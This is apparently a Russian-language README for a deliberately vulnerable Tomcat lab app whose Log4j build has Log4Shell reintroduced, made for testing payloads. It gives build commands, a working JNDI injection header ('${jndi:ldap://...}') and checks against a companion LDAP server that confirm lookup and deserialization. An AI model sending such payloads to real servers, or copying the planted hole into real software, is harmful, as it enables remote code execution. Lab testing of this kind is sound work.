# log4j-poc

Тестовое веб-приложение на основе Tomcat 10.1 (OpenJDK 21),
включающее уязвимую версию библиотеки Log4j 2.x версии 2.25
с внесенной уязвимостью Log4Shell. Уязвимое приложение
позволяет эксплуатацию в HTTP-заголовках, отправляемых в лог
Tomcat (/usr/local/tomcat/logs/catalina.out). Приложение
предназначено для целей тестирования и проверки полезных
нагрузок.

# Сборка и запуск

Для сборки и запуска необходима POSIX-совместимая операционная
система, включающая следующие компоненты:

- git
- docker
- curl

# сборка

```
git clone https://github.com/sercher/log4j-poc.git
cd log4j-poc
docker build -t log4j-poc:latest .
```

# запуск

```
docker run -d -p 8080:8080 --add-host=host:host-gateway log4j-poc
```

Запущенное приложение доступно по адресу

```
localhost:8080/myapp
```

# Проверка lookup без добавления полезной нагрузки

```
(
  nc -q1 -l 1389 &>/dev/null && echo '[!] VULNERABLE TO LOG4SHELL' &
  pid=$!
  curl -H 'Header-poc: ${jndi:ldap://host:1389/a}' 'http://localhost:8080/myapp/'
  sleep 1
  kill -9 $pid 2>/dev/null
)
```

Альтернативно можно использовать готовый собранный образ

```
docker pull sercher78/sercher:log4j-poc-small
```

Тогда запуск приложения будет осуществляться командой

```
docker run -d -p 8080:8080 --add-host=host:host-gateway sercher78/sercher:log4j-poc-small
```

# Проверка сериализации с добавлением полезной нагрузки

- maven
- сборка LDAP сервера (см. [ldap-server](https://github.com/sercher/ldap-server))

```
git clone https://github.com/sercher/ldap-server.git
cd ldap-server
mvn clean compile assembly:single
```

- запуск LDAP сервера

```
java -cp target/ldap-server-1.0-SNAPSHOT-jar-with-dependencies.jar LdapServer &
```

- проверка сериализации

```
(
  curl -H 'Header-poc: ${jndi:ldap://host:1389/a}' 'http://localhost:8080/myapp/' &>/dev/null && \
  docker exec -it $(docker ps -lq) tail /usr/local/tomcat/logs/application.log | grep OBJECT-DESERIALIZED && echo '[!] HIGHLY VULNERABLE TO LOG4SHELL'
)
```

- остановка LDAP сервера

```
fg
нажать <CTRL-C>
```

Отчет об уязвимостях docker hub:
- [sercher78/sercher:log4j-poc-small](https://hub.docker.com/repository/docker/sercher78/sercher/tags/log4j-poc-small/sha256-cb427a65309db895a21077ddb11de540ae629f4b9ddd0acab6f74a65376a1487)

Обнаруженные уязвимости целиком находятся во внутреннем слое (tomcat:10)